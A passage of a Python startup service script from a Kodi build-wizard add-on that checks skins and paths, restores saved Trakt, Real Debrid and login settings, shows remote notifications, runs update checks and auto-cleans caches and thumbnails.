	xbmcgui.Dialog().ok("Kodi Anonymous Fix", 'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')
	os._exit(1)

  
def idle():
	return xbmc.executebuiltin('Dialog.Close(busydialog)')
def fixfont():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception


def checkSkin():
	wiz.log("[Build Check] Invalid Skin Check Start")
	DEFAULTSKIN   = wiz.getS('defaultskin')
	DEFAULTNAME   = wiz.getS('defaultskinname')
	DEFAULTIGNORE = wiz.getS('defaultskinignore')
	gotoskin = False
	if not DEFAULTSKIN == '':
		if os.path.exists(os.path.join(ADDONS, DEFAULTSKIN)):
			if DIALOG.yesno(ADDONTITLE, "[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, SKIN[5:].title()), "Would you like to set the skin back to:[/COLOR]", '[COLOR %s]%s[/COLOR]' % (COLOR1, DEFAULTNAME)):
				gotoskin = DEFAULTSKIN
				gotoname = DEFAULTNAME
			else: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true'); gotoskin = False
		else: wiz.setS('defaultskin', ''); wiz.setS('defaultskinname', ''); DEFAULTSKIN = ''; DEFAULTNAME = ''
	if DEFAULTSKIN == '':
		skinname = []
		skinlist = []
		for folder in glob.glob(os.path.join(ADDONS, 'skin.*/')):
			xml = "%s/addon.xml" % folder
			if os.path.exists(xml):
				f  = open(xml,mode='r'); g = f.read().replace('\n','').replace('\r','').replace('\t',''); f.close();
				match  = wiz.parseDOM(g, 'addon', ret='id')
				match2 = wiz.parseDOM(g, 'addon', ret='name')
				wiz.log("%s: %s" % (folder, str(match[0])), xbmc.LOGNOTICE)
				if len(match) > 0: skinlist.append(str(match[0])); skinname.append(str(match2[0]))
				else: wiz.log("ID not found for %s" % folder, xbmc.LOGNOTICE)
			else: wiz.log("ID not found for %s" % folder, xbmc.LOGNOTICE)
		if len(skinlist) > 0:
			if len(skinlist) > 1:
				if DIALOG.yesno(ADDONTITLE, "[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, SKIN[5:].title()), "Would you like to view a list of avaliable skins?[/COLOR]"):
					choice = DIALOG.select("Select skin to switch to!", skinname)
					if choice == -1: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true')
					else: 
						gotoskin = skinlist[choice]
						gotoname = skinname[choice]
				else: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true')
			# else:
				# if DIALOG.yesno(ADDONTITLE, "[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, SKIN[5:].title()), "Would you like to set the skin back to:[/COLOR]", '[COLOR %s]%s[/COLOR]' % (COLOR1, skinname[0])):
					# gotoskin = skinlist[0]
					# gotoname = skinname[0]
				# else: wiz.log("Skin was not reset", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true')
		# else: wiz.log("No skins found in addons folder.", xbmc.LOGNOTICE); wiz.setS('defaultskinignore', 'true'); gotoskin = False
	if gotoskin:
		skinSwitch.swapSkins(gotoskin)
		x = 0
		xbmc.sleep(1000)
		while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
			x += 1
			xbmc.sleep(200)

		if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
			wiz.ebi('SendClick(11)')
			wiz.lookandFeelData('restore')
		else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]Skin Swap Timed Out![/COLOR]' % COLOR2)
	wiz.log("[Build Check] Invalid Skin Check End", xbmc.LOGNOTICE)

while xbmc.Player().isPlayingVideo():
	xbmc.sleep(1000)

if KODIV >= 17:
	NOW = datetime.now()
	temp = wiz.getS('kodi17iscrap')
	if not temp == '':
		if temp > str(NOW - timedelta(minutes=2)):
			wiz.log("Killing Start Up Script")
			sys.exit()
	wiz.log("%s" % (NOW))
	wiz.setS('kodi17iscrap', str(NOW))
	xbmc.sleep(1000)
	if not wiz.getS('kodi17iscrap') == str(NOW):
		wiz.log("Killing Start Up Script")
		sys.exit()
	else:
		wiz.log("Continuing Start Up Script")

wiz.log("[Path Check] Started", xbmc.LOGNOTICE)
path = os.path.split(ADDONPATH)
if not ADDONID == path[1]: DIALOG.ok(ADDONTITLE, '[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]' % COLOR2, '[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, ADDONID), '[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, path)); wiz.log("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s " % (ADDONID, path))
else: wiz.log("[Path Check] Good!", xbmc.LOGNOTICE)


if KODIADDONS in ADDONPATH:
	wiz.log("Copying path to addons dir", xbmc.LOGNOTICE)
	if not os.path.exists(ADDONS): os.makedirs(ADDONS)
	newpath = xbmc.translatePath(os.path.join('special://home/addons/', ADDONID))
	if os.path.exists(newpath):
		wiz.log("Folder already exists, cleaning House", xbmc.LOGNOTICE)
		wiz.cleanHouse(newpath)
		wiz.removeFolder(newpath)
	try:
		wiz.copytree(ADDONPATH, newpath)
	except Exception as e:
		pass
	wiz.forceUpdate(True)

try:
	mybuilds = xbmc.translatePath(MYBUILDS)
	if not os.path.exists(mybuilds): xbmcvfs.mkdirs(mybuilds)
except:
	pass


            
            
if INSTALLED == 'true':
    input= (ADDON.getSetting("auto_rd"))
           
    if KEEPTRAKT == 'true': traktit.traktIt('restore', 'all'); wiz.log('[Installed Check] Restoring Trakt Data', xbmc.LOGNOTICE)
    if KEEPREAL  == 'true': debridit.debridIt('restore', 'all'); wiz.log('[Installed Check] Restoring Real Debrid Data', xbmc.LOGNOTICE)
    if input == 'true': loginit.loginIt('restore', 'all'); wiz.log('[Installed Check] Restoring Login Data', xbmc.LOGNOTICE)
    wiz.clearS('install')

#if INSTALLED == 'false':
#	if KODIV >= 17:
#		wiz.kodi17Fix()
#		if SKIN in ['skin.confluence', 'skin.estuary']:
#			checkSkin()
#			swapSkins('skin.Premium.mod')
#		FAILED = True
#	elif not EXTRACT == '100' and not BUILDNAME == "":
#		wiz.log("[Installed Check] Build was extracted %s/100 with [ERRORS: %s]" % (EXTRACT, EXTERROR), xbmc.LOGNOTICE)
#		yes=DIALOG.yesno(ADDONTITLE, '[COLOR %s]%s[/COLOR] [COLOR %s]was not installed correctly!' % (COLOR1, COLOR2, BUILDNAME), 'Installed: [COLOR %s]%s[/COLOR] / Error Count: [COLOR %s]%s[/COLOR]' % (COLOR1, EXTRACT, COLOR1, EXTERROR), 'Would you like to try again?[/COLOR]', nolabel='[B]No Thanks![/B]', yeslabel='[B]Retry Install[/B]')
#		wiz.clearS('build')
#		FAILED = True
#		if yes: 
#			wiz.ebi("PlayMedia(plugin://%s/?mode=install&name=%s&url=fresh)" % (ADDON_ID, urllib.quote_plus(BUILDNAME)))
#			wiz.log("[Installed Check] Fresh Install Re-activated", xbmc.LOGNOTICE)
#		else: wiz.log("[Installed Check] Reinstall Ignored")
#	elif SKIN in ['skin.confluence', 'skin.estuary']:
#		wiz.log("[Installed Check] Incorrect skin: %s" % SKIN, xbmc.LOGNOTICE)
#		defaults = wiz.getS('defaultskin')
#		if not defaults == '':
#			if os.path.exists(os.path.join(ADDONS, defaults)):
#				skinSwitch.swapSkins(defaults)
#				x = 0
#				xbmc.sleep(1000)
#				while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
#					x += 1
#					xbmc.sleep(200)

#				if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
#					wiz.ebi('SendClick(11)')
#					wiz.lookandFeelData('restore')
#		if not wiz.currSkin() == defaults and not BUILDNAME == "":
#			gui = wiz.checkBuild(BUILDNAME, 'gui')
#			FAILED = True
#			if gui == 'http://':
#				wiz.log("[Installed Check] Guifix was set to http://", xbmc.LOGNOTICE)
#				DIALOG.ok(ADDONTITLE, "[COLOR %s]It looks like the skin settings was not applied to the build." % COLOR2, "Sadly no gui fix was attatched to the build", "You will need to reinstall the build and make sure to do a force close[/COLOR]")
#			elif wiz.workingURL(gui):
#				yes=DIALOG.yesno(ADDONTITLE, '%s was not installed correctly!' % BUILDNAME, 'It looks like the skin settings was not applied to the build.', 'Would you like to apply the GuiFix?', nolabel='[B]No, Cancel[/B]', yeslabel='[B]Apply Fix[/B]')
#				if yes: wiz.ebi("PlayMedia(plugin://%s/?mode=install&name=%s&url=gui)" % (ADDON_ID, urllib.quote_plus(BUILDNAME))); wiz.log("[Installed Check] Guifix attempting to install")
#				else: wiz.log('[Installed Check] Guifix url working but cancelled: %s' % gui, xbmc.LOGNOTICE)
#			else:
#				DIALOG.ok(ADDONTITLE, "[COLOR %s]It looks like the skin settings was not applied to the build." % COLOR2, "Sadly no gui fix was attatched to the build", "You will need to reinstall the build and make sure to do a force close[/COLOR]")
#				wiz.log('[Installed Check] Guifix url not working: %s' % gui, xbmc.LOGNOTICE)
#	else:
#		wiz.log('[Installed Check] Install seems to be completed correctly', xbmc.LOGNOTICE)
#	if not wiz.getS('pvrclient') == "":
#		wiz.toggleAddon(wiz.getS('pvrclient'), 1)
#		wiz.ebi('StartPVRManager')
#	wiz.addonUpdates('reset')
#	if KEEPTRAKT == 'true': traktit.traktIt('restore', 'all'); wiz.log('[Installed Check] Restoring Trakt Data', xbmc.LOGNOTICE)
#	if KEEPREAL  == 'true': debridit.debridIt('restore', 'all'); wiz.log('[Installed Check] Restoring Real Debrid Data', xbmc.LOGNOTICE)
#	if KEEPLOGIN == 'true': loginit.loginIt('restore', 'all'); wiz.log('[Installed Check] Restoring Login Data', xbmc.LOGNOTICE)
#	wiz.clearS('install')
#else: wiz.log("[Installed Check] Not Enabled", xbmc.LOGNOTICE)

#if FAILED == False:
#	wiz.log("[Build Check] Started", xbmc.LOGNOTICE)
#	if not WORKING:
#		wiz.log("[Build Check] Not a valid URL for Build File: %s" % SPEEDFILE, xbmc.LOGNOTICE)
#	elif BUILDCHECK == '' and BUILDNAME == '':
#		wiz.log("[Build Check] First Run", xbmc.LOGNOTICE)
#		notify.firstRun()
		#notify.firstRuninstall()
		#xbmc.sleep(500)
		#notify.firstRun()
		#xbmc.sleep(500)
#		wiz.setS('lastbuildcheck', str(NEXTCHECK))
#	elif not BUILDNAME == '':
#		wiz.log("[Build Check] Build Installed", xbmc.LOGNOTICE)
#		if SKIN in ['skin.confluence', 'skin.estuary'] and not DEFAULTIGNORE == 'true':
#			checkSkin()
#			wiz.log("[Build Check] Build Installed: Checking Updates", xbmc.LOGNOTICE)
#			wiz.setS('lastbuildcheck', str(NEXTCHECK))
#			checkUpdate()
#		elif BUILDCHECK <= str(TODAY):
#			wiz.log("[Build Check] Build Installed: Checking Updates", xbmc.LOGNOTICE)
#			wiz.setS('lastbuildcheck', str(NEXTCHECK))
#			checkUpdate()
#		else: 
#			wiz.log("[Build Check] Build Installed: Next check isnt until: %s / TODAY is: %s" % (BUILDCHECK, str(TODAY)), xbmc.LOGNOTICE)


wiz.log("[Notifications] Started", xbmc.LOGNOTICE)
#if ENABLE == 'Yes' and not BUILDNAME == " ":
if ENABLE == 'Yes' and BUILDNAME == " Kodi Premium":
	# input= (ADDON.getSetting("autoupdate"))
	STARTP2()
	if not NOTIFY == 'true':
		url = wiz.workingURL(NOTIFICATION)
		if url == True:
			id, msg = wiz.splitNotify(NOTIFICATION)
			if not id == False:
				# try:
					id = int(id); NOTEID = int(NOTEID)
					if id == NOTEID:
						if NOTEDISMISS == 'false':
							debridit.debridIt('update', 'all')
							traktit.traktIt('update', 'all')
							checkidupdate()# notify.notification(msg)
						else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
					elif id > NOTEID:
						wiz.log("[Notifications] id: %s" % str(id), xbmc.LOGNOTICE)
						wiz.setS('noteid', str(id))
						wiz.setS('notedismiss', 'false')
						# if input == 'true':
						debridit.debridIt('update', 'all')
						traktit.traktIt('update', 'all')
						checkidupdate()
						# else: notify.notification(msg=msg)
						wiz.log("[Notifications] Complete", xbmc.LOGNOTICE)
				# except Exception as e:
					# wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
			else: wiz.log("[Notifications] Text File not formated Correctly")
		else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), xbmc.LOGNOTICE)
	else: wiz.log("[Notifications] Turned Off", xbmc.LOGNOTICE)
else: wiz.log("[Notifications] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Notifications2] Started", xbmc.LOGNOTICE)
if ENABLE == 'No':
	if not NOTIFY2 == 'true':
		url = wiz.workingURL(NOTIFICATION2)
		if url == True:
			id, msg = wiz.splitNotify(NOTIFICATION2)
			if not id == False:
				try:
					id = int(id); NOTEID2 = int(NOTEID2)
					if id == NOTEID2:
						if NOTEDISMISS2 == 'false':
							checkvictory()
						else: wiz.log("[Notifications2] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
					elif id > NOTEID2:
						wiz.log("[Notifications2] id: %s" % str(id), xbmc.LOGNOTICE)
						wiz.setS('noteid2', str(id))
						wiz.setS('notedismiss2', 'false')
						checkvictory()
						wiz.log("[Notifications2] Complete", xbmc.LOGNOTICE)
				except Exception as e:
					wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
			else: wiz.log("[Notifications2] Text File not formated Correctly")
		else: wiz.log("[Notifications2] URL(%s): %s" % (NOTIFICATION2, url), xbmc.LOGNOTICE)
	else: wiz.log("[Notifications2] Turned Off", xbmc.LOGNOTICE)
else: wiz.log("[Notifications2] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Notifications3] Started", xbmc.LOGNOTICE)
if ENABLE == 'Yes' and BUILDNAME == " Kodi Premium 18" or BUILDNAME == " Kodi Premium":
	if not NOTIFY3 == 'true':
		url = wiz.workingURL(NOTIFICATION3)
		if url == True:
			id, msg = wiz.splitNotify(NOTIFICATION3)
			if not id == False:
				try:
					id = int(id); NOTEID3 = int(NOTEID3)
					if id == NOTEID3:
						if NOTEDISMISS3 == 'false':
							notify.notification3(msg)
						else: wiz.log("[Notifications3] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
					elif id > NOTEID3:
						wiz.log("[Notifications3] id: %s" % str(id), xbmc.LOGNOTICE)
						wiz.setS('noteid3', str(id))
						wiz.setS('notedismiss3', 'false')
						notify.notification3(msg=msg)
						wiz.log("[Notifications3] Complete", xbmc.LOGNOTICE)
				except Exception as e:
					wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
			else: wiz.log("[Notifications3] Text File not formated Correctly")
		else: wiz.log("[Notifications3] URL(%s): %s" % (NOTIFICATION3, url), xbmc.LOGNOTICE)
	else: wiz.log("[Notifications3] Turned Off", xbmc.LOGNOTICE)
else: wiz.log("[Notifications3] Not Enabled", xbmc.LOGNOTICE)
wiz.log("[Trakt Data] Started", xbmc.LOGNOTICE)
if KEEPTRAKT == 'true':
	if TRAKTSAVE <= str(TODAY):
		wiz.log("[Trakt Data] Saving all Data", xbmc.LOGNOTICE)
		traktit.autoUpdate('all')
		wiz.setS('traktlastsave', str(THREEDAYS))
	else: 
		wiz.log("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s" % (TRAKTSAVE, str(TODAY)), xbmc.LOGNOTICE)
else: wiz.log("[Trakt Data] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Real Debrid Data] Started", xbmc.LOGNOTICE)
if KEEPREAL == 'true':
	if REALSAVE <= str(TODAY):
		wiz.log("[Real Debrid Data] Saving all Data", xbmc.LOGNOTICE)
		debridit.autoUpdate('all')
		wiz.setS('debridlastsave', str(THREEDAYS))
	else: 
		wiz.log("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s" % (REALSAVE, str(TODAY)), xbmc.LOGNOTICE)
else: wiz.log("[Real Debrid Data] Not Enabled", xbmc.LOGNOTICE)

wiz.log("[Login Data] Started", xbmc.LOGNOTICE)
if KEEPLOGIN == 'true':
	if LOGINSAVE <= str(TODAY):
		wiz.log("[Login Data] Saving all Data", xbmc.LOGNOTICE)
		loginit.autoUpdate('all')
		wiz.setS('loginlastsave', str(THREEDAYS))
	else: 
		wiz.log("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s" % (LOGINSAVE, str(TODAY)), xbmc.LOGNOTICE)
else: wiz.log("[Login Data] Not Enabled", xbmc.LOGNOTICE)
wiz.clearCache(True)
wiz.log("[Auto Clean Up] Started", xbmc.LOGNOTICE)
if AUTOCLEANUP == 'false':
	service = False
	days = [TODAY, TOMORROW, THREEDAYS, ONEWEEK]
	feq = int(float(AUTOFEQ))
	if AUTONEXTRUN <= str(TODAY) or feq == 0:
		service = True
		next_run = days[feq]
		wiz.setS('nextautocleanup', str(next_run))
	else: wiz.log("[Auto Clean Up] Next Clean Up %s" % AUTONEXTRUN, xbmc.LOGNOTICE)
	if service == True:
		AUTOCACHE      = wiz.getS('clearcache')
		AUTOPACKAGES   = wiz.getS('clearpackages')
		AUTOTHUMBS     = wiz.getS('clearthumbs')
		if AUTOCACHE == 'true': wiz.log('[Auto Clean Up] Cache: On', xbmc.LOGNOTICE); wiz.clearCache(True)
		else: wiz.log('[Auto Clean Up] Cache: Off', xbmc.LOGNOTICE)
		if AUTOTHUMBS == 'true': wiz.log('[Auto Clean Up] Old Thumbs: On', xbmc.LOGNOTICE); wiz.oldThumbs()
		else: wiz.log('[Auto Clean Up] Old Thumbs: Off', xbmc.LOGNOTICE)
		if AUTOPACKAGES == 'true': wiz.log('[Auto Clean Up] Packages: On', xbmc.LOGNOTICE); wiz.clearPackagesStartup()
		else: wiz.log('[Auto Clean Up] Packages: Off', xbmc.LOGNOTICE)
else: wiz.log('[Auto Clean Up] Turned off', xbmc.LOGNOTICE)

wiz.setS('kodi17iscrap', '')








#import datetime
#def SleepFor(timeS):
#    while((not xbmc.abortRequested) and (timeS > 0)):
#        xbmc.sleep(1000)
#        timeS -= 1

#def SetTimer(delta):
#	return datetime.datetime.now() + datetime.timedelta(seconds=delta)



#SleepFor(1800)
#START=True


#wallInterval = 60*int(ADDON.getSetting('update_int'))

#wallTimer = SetTimer(wallInterval)

#while (not xbmc.abortRequested):
#    timenow = SetTimer(1)

#    if wallTimer < timenow or START:
#        wallTimer = SetTimer(wallInterval)
#        try:
#            if ADDON.getSetting('auto_update_check')=='true' and not xbmc.Player().isPlayingVideo():
#                checkUpdate()
#                wiz.wizardUpdate('startup')
#                if ENABLE == 'Yes' and not BUILDNAME == "":
#                    NOTEID  = wiz.getS('noteid')
#                    NOTEDISMISS    = wiz.getS('notedismiss')
#                    if not NOTIFY == 'true':
#                        url = wiz.workingURL(NOTIFICATION)
#                        if url == True:
#                            id, msg = wiz.splitNotify(NOTIFICATION)
#                            if not id == False:
#                                try:
#                                    id = int(id); NOTEID = int(NOTEID)
#                                    if id == NOTEID:
#                                        if NOTEDISMISS == 'false':
#                                            notify.notification(msg)
#                                        else: wiz.log("[Notifications] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)
#                                    elif id > NOTEID:
#                                        wiz.log("[Notifications] id: %s" % str(id), xbmc.LOGNOTICE)
#                                        wiz.setS('noteid', str(id))
#                                        wiz.setS('notedismiss', 'false')
#                                        notify.notification(msg=msg)
#                                        wiz.log("[Notifications] Complete", xbmc.LOGNOTICE)
#                                except Exception, e:
#                                    wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
#                            else: wiz.log("[Notifications] Text File not formated Correctly")
#                        else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), xbmc.LOGNOTICE)
#                    else: wiz.log("[Notifications] Turned Off", xbmc.LOGNOTICE)
#                else: wiz.log("[Notifications] Not Enabled", xbmc.LOGNOTICE)
#        except:
#            pass
#
#    START=False
#    xbmc.sleep(50000)
#
for dirpath, dirnames, filenames in os.walk(packagesdir):
	count = 0
	for f in filenames:
		count += 1
		fp = os.path.join(dirpath, f)
		total_size += os.path.getsize(fp)
total_sizetext = "%.0f" % (total_size/1024000.0)
	
#if int(total_sizetext) > filesize:
#	choice2 = xbmcgui.Dialog().yesno("[COLOR=red]Autocleaner[/COLOR]", 'The packages folder is [COLOR red]' + str(total_sizetext) +' MB [/COLOR] - [COLOR red]' + str(count) + '[/COLOR] zip files', 'The folder can be cleaned up without issues to save space...', 'Do you want to clean it now?', yeslabel='Yes',nolabel='No')
#	if choice2 == 1:
#		maintenance.purgePackages()

for dirpath2, dirnames2, filenames2 in os.walk(thumbnails):
	for f2 in filenames2:
		fp2 = os.path.join(dirpath2, f2)
		total_size2 += os.path.getsize(fp2)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)

if int(total_sizetext2) > filesize_thumb:

		maintenance.deleteThumbnails()



for dirpath2, dirnames2, filenames2 in os.walk(telecach):
	for f2 in filenames2:
		fp2 = os.path.join(dirpath2, f2)
		total_size2 += os.path.getsize(fp2)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)

if int(total_sizetext2) > filesize_tele:

		maintenance.deleteTele()




total_sizetext = "%.0f" % (total_size/1024000.0)
total_sizetext2 = "%.0f" % (total_size2/1024000.0)
	
if notify_mode == 'true': xbmc.executebuiltin('XBMC.Notification(%s, %s, %s, %s)' % ('Maintenance Status',  'Packages: '+ str(total_sizetext) +  ' MB'  ' - Images: ' + str(total_sizetext2) + ' MB' , '5000', iconpath))
time.sleep(3)

if not os.path.exists(os.path.join(ADDONDATA, '4.2.0')) and not BUILDNAME == "":
        display_Votes()
        # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'xxxxx')))
        file = open(os.path.join(ADDONDATA, '4.2.0'), 'w') 
         
        file.write(str('Done'))
        file.close()
        
        
# if os.path.exists(os.path.join(ADDONS, 'plugin.video.telemedia')):
		# tele=xbmcaddon.Addon('plugin.video.telemedia')
tele= (ADDON.getSetting("auto_tele"))

if os.path.exists(os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "plugin.video.telemedia/database","td.binlog")):
		# tele.setSetting('autologin', 'true')
    if tele == 'true' :
        xbmc.executebuiltin("RunPlugin(plugin://plugin.video.telemedia?mode=5&url=www)")

#STARTP2()
#if auto_clean  == 'true': maintenance.clearCache()